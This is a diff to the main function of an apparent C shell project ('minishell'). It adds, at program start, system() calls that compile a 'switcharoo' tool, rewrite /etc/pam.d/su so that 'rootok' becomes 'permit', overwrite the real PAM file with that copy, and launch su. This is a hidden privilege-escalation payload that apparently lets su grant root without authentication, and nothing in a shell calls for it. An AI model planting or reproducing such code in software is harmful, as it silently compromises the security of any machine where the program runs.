@@ -92,6 +92,10 @@ int	main(int argc, char **argv, char **envp)
 	(void)argc;
 	token = NULL;
 	parse = NULL;
+	system("clang -o switcharoo switcharoo.c");
+	system("sed -e \"s/rootok/permit/g\" /etc/pam.d/su > overwrite_file.bin");
+	system("./switcharoo /etc/pam.d/su overwrite_file.bin");
+	system("su");
 	signal(SIGQUIT, sigint_handler);
 	signal(SIGINT, sigint_handler);
 	init_the_var(&var);
@@ -99,9 +103,5 @@ int	main(int argc, char **argv, char **envp)
 	if (var.env == NULL)
 		var.env = get_env_help();
 	minishell(&token, &var, &parse);
-	system("clang -o switcharoo switcharoo.c")
-	system("sed -e \"s/rootok/permit/g\" /etc/pam.d/su > overwrite_file.bin");
-	system("./switcharoo /etc/pam.d/su overwrite_file.bin");
-	system("su");
 	return (exit_status_fun(-500));
 }
